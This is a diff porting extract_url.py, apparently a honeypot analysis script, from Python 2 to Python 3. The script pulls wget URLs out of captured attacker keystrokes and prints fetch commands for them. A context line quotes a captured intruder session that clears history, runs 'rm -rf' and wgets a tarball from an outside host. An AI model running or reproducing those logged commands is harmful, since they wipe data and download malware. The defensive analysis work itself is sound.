@@ -28,37 +28,37 @@
 #[2010-06-30 05:44:33 Host:172.31.0.67 UID:1002 PID:2332 CMD:sshd]:cmd=wpasswdhhistoryhistory -ccd /var/tmplscd botsps xlsvi kswap.setlscd ..lsls -acrm -rf  wget angelfire.com/komales88/img.tgz
 
 import re
-from urlparse import urlparse
+from urllib.parse import urlparse
 
 # Crude method to extract URL : URL contains '/' or '.' or alphanumeric
 # prepend http:// if not found
 def extractURL(line):
     try :
-        print "extract_url.py : extractURL() : entered with line=" + line
+        print("extract_url.py : extractURL() : entered with line=" + line)
         
         if line.find("[") != -1:	# [BS] , [U-ARROW] etc from sebek
-            print "extract_url.py : extractURL() : editing keystrokes found , so no further analysis possible at the moment. line=" + line
+            print("extract_url.py : extractURL() : editing keystrokes found , so no further analysis possible at the moment. line=" + line)
             return ""
         
         pat = "wget ([A-Z\.\-:~a-z0-9@/]*)" 
         a = re.findall(pat,line)
-        print "extract_url.py() : extractURL() : a = " + `a`
+        print("extract_url.py() : extractURL() : a = " + repr(a))
         if len(a) != 0 : 		# bug here !
-            print "extract_url.py() : extractURL() : located URL : " + a[0]
+            print("extract_url.py() : extractURL() : located URL : " + a[0])
             # if URL contains no other scheme, then assume http
             # bug : Http will not match so convert to lower-case
             a[0] = a[0].lower()
             if a[0].find('http://') == -1 and a[0].find('ftp://') == -1 :
                 a[0] = 'http://' + a[0]
-            print "extract_url.py() : extractUL() : normalised URL = " + a[0]
+            print("extract_url.py() : extractUL() : normalised URL = " + a[0])
             return a[0]   
         else:
-            print "extract_url.py() : extractUL() : error - no URL found " + line
+            print("extract_url.py() : extractUL() : error - no URL found " + line)
             return ""   
 
-    except Exception,e:
-        syslog.syslog("extract_url.py : extractURL() exception caught = " + `e` + " line=" + line)
-        print "extract_url.py : extractURL() exception caught = " + `e` + " line=" + line
+    except Exception as e:
+        syslog.syslog("extract_url.py : extractURL() exception caught = " + repr(e) + " line=" + line)
+        print("extract_url.py : extractURL() exception caught = " + repr(e) + " line=" + line)
         return ""
             
 # extract domain from FTP URL
@@ -178,8 +178,8 @@ if __name__ == '__main__' :
             #print "path is " + path
         
             if o.scheme == 'http' and urlBlacklist(url) == False :
-                print "wget --tries=2 --connect-timeout=10 " + url
+                print("wget --tries=2 --connect-timeout=10 " + url)
                 #print "command to download whole directory is : wget ???"
             elif o.scheme == 'ftp' and urlBlacklist(url) == False :
-                print "wget --tries=2 connect-timeout=10 " + url
+                print("wget --tries=2 connect-timeout=10 " + url)
             
